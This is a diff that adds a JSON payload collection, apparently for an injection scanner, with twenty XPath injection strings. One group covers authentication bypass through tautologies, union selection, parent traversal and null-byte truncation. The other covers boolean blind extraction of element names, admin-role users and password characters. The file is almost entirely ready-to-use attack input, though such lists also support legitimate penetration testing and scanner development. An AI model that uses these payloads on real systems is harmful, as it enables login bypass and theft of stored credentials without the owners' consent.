@@ -1,0 +1,35 @@
+{
+  "category": "xpath_injection",
+  "contexts": {
+    "authentication_bypass": {
+      "description": "XPath injection to bypass login and authentication queries",
+      "payloads": [
+        {"payload": "' or '1'='1", "description": "Classic OR tautology single quote", "waf_bypass": false},
+        {"payload": "' or 1=1 or ''='", "description": "Double OR tautology", "waf_bypass": false},
+        {"payload": "admin' or '1'='1", "description": "Target admin user with tautology", "waf_bypass": false},
+        {"payload": "' or true() or '", "description": "XPath true() function bypass", "waf_bypass": false},
+        {"payload": "'] | //user/*[' ", "description": "Union operator to select all user nodes", "waf_bypass": false},
+        {"payload": "' or string-length(name(/*))>0 or '1'='1", "description": "Probe root element name length", "waf_bypass": false},
+        {"payload": "x']/..//password | a['b", "description": "Parent traversal to reach password nodes", "waf_bypass": false},
+        {"payload": "\" or \"1\"=\"1", "description": "Double quote OR tautology", "waf_bypass": false},
+        {"payload": "admin']/parent::*/child::node()%00", "description": "Null byte truncation with parent traversal", "waf_bypass": false},
+        {"payload": "' or contains(.,'admin') or '1'='1", "description": "contains() function injection", "waf_bypass": false}
+      ]
+    },
+    "data_extraction": {
+      "description": "XPath injection for extracting data via boolean or error-based techniques",
+      "payloads": [
+        {"payload": "1' and count(//*)>0 and '1'='1", "description": "Boolean probe — count all elements", "waf_bypass": false},
+        {"payload": "1' and string-length(name(/*))>0 and '1'='1", "description": "Boolean probe — root element name length", "waf_bypass": false},
+        {"payload": "1' and substring(name(/*),1,1)='a' and '1'='1", "description": "Character-by-character root element extraction", "waf_bypass": false},
+        {"payload": "1' and count(//user)>0 and '1'='1", "description": "Boolean probe for user element existence", "waf_bypass": false},
+        {"payload": "1' and string-length(//user[1]/password)>0 and '1'='1", "description": "Probe password field existence and length", "waf_bypass": false},
+        {"payload": "1' and substring(//user[1]/password,1,1)='a' and '1'='1", "description": "Extract first char of password field", "waf_bypass": false},
+        {"payload": "1' and count(//user[contains(role,'admin')])>0 and '1'='1", "description": "Probe for admin-role users", "waf_bypass": false},
+        {"payload": "1' and contains(system-property('xsl:version'),'1') and '1'='1", "description": "XSLT version fingerprint via system-property", "waf_bypass": false},
+        {"payload": "1' and name(//*[1])!='x' and '1'='1", "description": "Element name extraction via inequality", "waf_bypass": false},
+        {"payload": "1' and count(//*[contains(name(),'pass')])>0 and '1'='1", "description": "Search for password-like element names", "waf_bypass": false}
+      ]
+    }
+  }
+}
